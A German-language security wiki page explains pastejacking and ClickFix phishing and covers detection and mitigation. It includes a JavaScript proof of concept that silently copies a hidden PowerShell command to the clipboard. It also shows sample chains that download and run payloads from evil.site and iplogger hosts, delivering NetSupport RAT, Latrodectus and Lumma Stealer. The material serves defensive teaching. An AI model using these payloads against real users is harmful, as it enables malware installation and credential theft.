# Clipboard Hijacking (Pastejacking) Angriffe

{{#include ../../banners/hacktricks-training.md}}

> "Kopiere niemals etwas, das du nicht selbst kopiert hast." – alter, aber immer noch gültiger Rat

## Übersicht

Clipboard Hijacking – auch bekannt als *Pastejacking* – missbraucht die Tatsache, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) platziert programmgesteuert vom Angreifer kontrollierten Text in die Systemzwischenablage. Die Opfer werden normalerweise durch sorgfältig gestaltete Social-Engineering-Anweisungen ermutigt, **Win + R** (Ausführen-Dialog), **Win + X** (Schnellzugriff / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage *einzufügen*, wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Webinhalts-Sicherheitskontrollen, die Anhänge, Makros oder die direkte Befehlsausführung überwachen. Der Angriff ist daher in Phishing-Kampagnen beliebt, die handelsübliche Malware-Familien wie NetSupport RAT, Latrodectus Loader oder Lumma Stealer verbreiten.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere verlassen sich auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Der ClickFix / ClearFake Flow

1. Der Benutzer besucht eine typosquatted oder kompromittierte Seite (z.B. `docusign.sa[.]com`)
2. Injizierte **ClearFake** JavaScript ruft einen `unsecuredCopyToClipboard()` Helfer auf, der stillschweigend eine Base64-kodierte PowerShell-Einzeiler in die Zwischenablage speichert.
3. HTML-Anweisungen sagen dem Opfer: *„Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu lösen.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL-Sideloading).
5. Der Loader entschlüsselt zusätzliche Stufen, injiziert Shellcode und installiert Persistenz (z.B. geplante Aufgabe) – letztendlich wird NetSupport RAT / Latrodectus / Lumma Stealer ausgeführt.

### Beispiel NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) sucht in seinem Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst dynamisch APIs mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit einem rollierenden XOR-Schlüssel `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter  
2. Führt den JScript-Downloader in **cscript.exe** aus  
3. Holt eine MSI-Nutzlast → legt `libcef.dll` neben einer signierten Anwendung ab → DLL-Sideloading → Shellcode → Latrodectus.  

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` durch `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldeinformationen an `sumeriavgv.digital` exfiltriert.

## Erkennung & Jagd

Blue-Teams können Clipboard-, Prozess-Erstellungs- und Registrierungs-Telemetrie kombinieren, um Pastejacking-Missbrauch zu identifizieren:

* Windows-Registrierung: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` führt eine Historie von **Win + R**-Befehlen – suchen Sie nach ungewöhnlichen Base64 / obfuskierten Einträgen.
* Sicherheitsereignis-ID **4688** (Prozess-Erstellung), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Ereignis-ID **4663** für Datei-Erstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern kurz vor dem verdächtigen 4688-Ereignis.
* EDR-Clipboard-Sensoren (falls vorhanden) – korrelieren Sie `Clipboard Write`, gefolgt von einem neuen PowerShell-Prozess.

## Minderung

1. Browser-Härtung – deaktivieren Sie den Schreibzugriff auf die Zwischenablage (`dom.events.asyncClipboard.clipboardItem` usw.) oder verlangen Sie eine Benutzerinteraktion.
2. Sicherheitsbewusstsein – schulen Sie Benutzer, sensible Befehle *einzutippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Ausführungsrichtlinie + Anwendungssteuerung, um willkürliche Einzeiler zu blockieren.
4. Netzwerksteuerungen – blockieren Sie ausgehende Anfragen an bekannte Pastejacking- und Malware-C2-Domains.

## Verwandte Tricks

* **Discord Invite Hijacking** missbraucht oft denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referenzen

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
